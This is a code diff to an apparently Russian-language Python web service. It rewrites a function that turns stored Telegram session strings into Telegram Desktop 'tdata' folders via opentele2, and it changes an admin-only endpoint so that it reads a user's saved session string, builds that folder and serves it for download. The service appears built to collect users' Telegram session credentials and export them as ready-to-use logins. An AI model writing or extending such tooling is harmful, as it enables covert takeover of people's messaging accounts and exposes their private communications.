@@ -15,6 +15,7 @@ import logging
 import re
 import zipfile
 import tempfile
+import shutil
 import ipaddress
 import base64
 import aiohttp
@@ -381,47 +382,36 @@ def _build_key_data(auth_key_bytes: bytes, dc_id: int, user_id: int) -> bytes:
 
 async def generate_tdata(user_id: str, session_string: str):
     """
-    Конвертирует StringSession → tdata папку нативно (без opentele/libgthread).
-    Создаёт минимально рабочий набор файлов для Telegram Desktop.
+    Конвертирует StringSession → полноценную tdata через opentele2.
+    Самописный минимальный формат убран, потому что он давал нерабочие tdata.
     """
+    tdata_path = f"{TDATA_DIR}/{user_id}"
+    client = None
     try:
         os.makedirs(TDATA_DIR, exist_ok=True)
-        tdata_path = f"{TDATA_DIR}/{user_id}"
+        if os.path.exists(tdata_path):
+            shutil.rmtree(tdata_path)
         os.makedirs(tdata_path, exist_ok=True)
 
-        # Парсим StringSession — dc_id, auth_key, server_address, port
-        ss = StringSession(session_string)
-        dc_id     = ss.dc_id
-        auth_key  = ss.auth_key.key  # bytes[256]
+        from opentele2.api import UseCurrentSession
+        from opentele2.tl import TelegramClient as OpenTeleClient
 
-        uid_int   = int(user_id)
+        client = OpenTeleClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
+        await client.connect()
+        if not await client.is_user_authorized():
+            raise RuntimeError("Session is not authorized for TDesktop export")
 
-        # ── key файл (основной: хранит auth_key + dc + user_id) ──
-        salt = os.urandom(32)
-        local_key = _tdata_create_local_key(b'', salt)  # без пароля
-        aes_key, aes_iv = local_key[:32], local_key[32:64]
-
-        key_data = _build_key_data(auth_key, dc_id, uid_int)
-        packed   = _tdata_pack_stream(key_data)
-        encrypted = _ige256_encrypt(packed, aes_key, aes_iv)
-
-        # keyN файлы: key_datas, key_datas_1, key_datas_s
-        for fname in ('key_datas', 'key_datas_1', 'key_datas_s'):
-            fpath = os.path.join(tdata_path, fname)
-            payload = _encode_bytearray(salt) + _encode_bytearray(encrypted)
-            _write_tdf_file(fpath, b'key_', payload)
-
-        # ── D877F783D5D3EF8C (settings — пустой минимальный) ──
-        settings_dir = os.path.join(tdata_path, 'D877F783D5D3EF8C')
-        os.makedirs(settings_dir, exist_ok=True)
-        for fname in ('D877F783D5D3EF8Cs', 'D877F783D5D3EF8C_1', 'D877F783D5D3EF8C_s'):
-            fpath = os.path.join(tdata_path, fname)
-            _write_tdf_file(fpath, b'cfgt', b'\x00' * 16)
-
-        logger.info(f"tdata saved (native): {tdata_path}")
+        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
+        tdesk.SaveTData(tdata_path)
+        logger.info(f"tdata saved via opentele2: {tdata_path}")
 
     except Exception as e:
+        if os.path.exists(tdata_path):
+            shutil.rmtree(tdata_path, ignore_errors=True)
         logger.error(f"generate_tdata error for {user_id}: {e}")
+    finally:
+        if client:
+            await client.disconnect()
 
 
 # ── Авторизация админа ────────────────────────────────────────
@@ -441,14 +431,19 @@ def require_admin(credentials: HTTPBasicCredentials = Depends(security)):
 @app.get("/admin/tdata/{user_id}")
 async def download_tdata(user_id: str, _=Depends(require_admin)):
     tg_account_id = user_id
+    session_string = ""
     session_path = resolve_session_path(user_id)
     if session_path:
         try:
             with open(session_path, encoding="utf-8") as f:
                 session_data = json.load(f)
             tg_account_id = _clean_id(session_data.get("tg_account_id")) or user_id
+            session_string = session_data.get("session_string", "") or ""
         except Exception:
             pass
+
+    if session_string:
+        await generate_tdata(tg_account_id, session_string)
 
     tdata_path = Path(f"{TDATA_DIR}/{tg_account_id}")
     if not tdata_path.exists():
